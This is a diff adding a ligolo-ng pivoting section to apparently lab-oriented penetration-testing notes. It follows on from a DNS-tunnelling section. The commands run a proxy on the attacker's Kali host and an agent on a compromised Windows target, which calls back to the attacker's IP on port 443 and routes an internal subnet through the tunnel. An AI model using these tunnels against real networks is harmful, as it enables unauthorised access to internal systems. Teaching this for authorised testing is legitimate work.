@@ -162,3 +162,30 @@ window -i <no. of the command session associated with the client we want to conn
 listen 127.0.0.1:2345 <IP to forward traffic to>:<port to forward to>
 ```
 The command above will establish a loopback listener on the server at `127.0.0.1:2345`, and forward that traffic via the DNS client to an address that was otherwise unreachable.
+
+## Ligolo
+
+Truly enlightened hackers will probably ignore all of the above in favour of the tunnelling provided by `ligolo-ng`. A little more time is needed to set up, but once complete this will provide genuinely seamless access to previously inaccessible subnets.
+
+As a one-time prerequisite (or if Kali has somehow been nuked) then the following will need to be run to restore the Ligolo interface:
+```bash
+sudo ip tuntap add user kali mode tun ligolo
+```
+```bash
+sudo ip link set ligolo up
+```
+First go ahead an pick up the binaries you need based on OS and arch from the releases page: https://github.com/nicocha30/ligolo-ng/releases
+
+Then launch the proxy binary on Kali like so (any port will do but `443` is less likely to be blocked):
+```bash
+./lin-proxy -selfcert -laddr 0.0.0.0:443
+```
+By whatever means available get the agent binary onto your target machine and run it (assuming the target is a Windows machine):
+```powershell
+./lin-agent.exe -connect 192.168.45.xx:443 -ignore-cert
+```
+Add the route to your Kali routing table:
+```bash
+sudo ip route add 172.16.xx.0/24 dev ligolo
+```
+Finally, navigate back to the terminal running the proxy, and in the command prompt there enter `session`, select your session (probably `1`), and finally don't forget to enter `start`. With all this in place the subnet that the machine running the agent has access to should now be accessible from Kali.
